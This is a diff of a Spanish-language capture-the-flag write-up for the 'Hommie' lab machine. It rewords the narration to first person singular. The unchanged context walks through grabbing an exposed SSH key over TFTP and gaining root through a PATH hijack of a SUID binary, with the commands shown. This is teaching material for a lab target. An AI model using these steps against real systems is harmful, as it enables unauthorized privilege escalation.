@@ -63,7 +63,7 @@ PORT   STATE SERVICE VERSION
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 ### HTTP (80)
-Inspeccionamos el puerto 80 con curl, vemos que alexia puede ser un usuario del archivo `id_rsa`
+Lanzo curl al puerto 80, veo que alexia podría ser un usuario potencial.
 ```bash
 ❯ curl -s http://192.168.1.96
 alexia, Your id_rsa is exposed, please move it!!!!!
@@ -72,13 +72,13 @@ Im fighting regarding reverse shells!
 ```
 
 ### FTP (21)
-Nos conectamos al servidor FTP.
+Me conecto al servidor FTP.
 ```bash
 ❯ ftp 192.168.1.96
 ```
 ![](/assets/images/hmvm-Hommie/ftp.png)
 
-Entramos al directorio `.web` y nos descargamos el index.html.
+Entro al directorio `.web` y descargo index.html.
 ```bash
 ftp> cd .web
 250 Directory successfully changed.
@@ -94,7 +94,7 @@ local: index.html remote: index.html
 226 Transfer complete.
 ```
 
-Abrimos `index.html`y vemos que es la página que vimos anteriormente con curl.
+Abro `index.html`y me doy cuenta que es la página que vi anteriormente con curl.
 
 ![](/assets/images/hmvm-Hommie/catindex.png)
 
@@ -113,9 +113,9 @@ Nmap encuentra dos puertos, el que nos interesa es el 69 tftp (Trivial File Tran
 
 ![](/assets/images/hmvm-Hommie/tftp.png)
 
-> TFTP no se puede listar el contenido de los directorios por lo que debes de saber exactamente que és lo que quieres descargar.
+> En un TFTP no se puede listar el contenido de los directorios por lo que debes de saber exactamente que és lo que quieres descargar.
 
-Damos permisos al fichero id_rsa y nos conectamos como usuario alexia. 
+Doy permisos al archivo `id_rsa` y me conecto como usuario alexia. 
 ```bash
 ❯ chmod 600 id_rsa
 ❯ ssh -i id_rsa alexia@192.168.1.96
@@ -131,7 +131,7 @@ alexia@hommie:~$ cat user.txt
 Imxxxxxxt
 ```
 
-En el directorio /opt vemos un binario `showMetheKey`, este binario tiene permisos SUID.
+En el directorio /opt veo un binario `showMetheKey`, este binario tiene permisos SUID.
 ```bash
 alexia@hommie:/opt$ ls -la
 total 28
@@ -140,11 +140,11 @@ drwxr-xr-x 18 root root  4096 Sep 30  2020 ..
 -rwsr-sr-x  1 root root 16720 Sep 30  2020 showMetheKey
 ```
 
-Le paso un strings al binario y vemos que esta imprimiendo el archivo `id_rsa` con cat así que aquí podemos explotar la variable PATH.
+Le paso un strings al binario y me doy cuenta que esta imprimiendo el archivo `id_rsa` con cat así que aquí podemos explotar la variable PATH.
 
 ![](/assets/images/hmvm-Hommie/stringsSUID.png)
 
-Nos vamos al directorio /tmp y creamos un archivo con el nombre cat y le damos permisos de ejecución.
+Me voy al directorio `/tmp` creo un archivo con el nombre `cat` y le doy permisos de ejecución.
 
 ```bash
 alexia@hommie:/opt$ cd /tmp
@@ -163,14 +163,14 @@ Exportamos el PATH al directorio `/tmp` que es donde hemos creado el archivo.
 alexia@hommie:/tmp$ export PATH=/tmp:$PATH
 ```
 
-Ejecutamos el binario y obtendremos el root.
+Ejecuto el binario y obtengo el root.
 ```bash
 alexia@hommie:/tmp$ /opt/showMetheKey
 root@hommie:/tmp# id
 uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(alexia)
 ```
 
-Vamos al directorio /root para leer la flag pero no está la flag, hay un fichero de texto `note.txt`.
+Voy al directorio `/root` para leer la flag pero no está la flag, hay un fichero de texto `note.txt`.
 ```bash
 root@hommie:/root# ls
 note.txt
@@ -182,7 +182,7 @@ root@hommie:/root# head note.txt
 I dont remember where I stored root.txt !!!
 ```
 
-Buscaremos la flag de root con find.
+Buscaré la flag de root con find.
 ```bash
 root@hommie:/root# find / -name root.txt
 /usr/include/root.txt
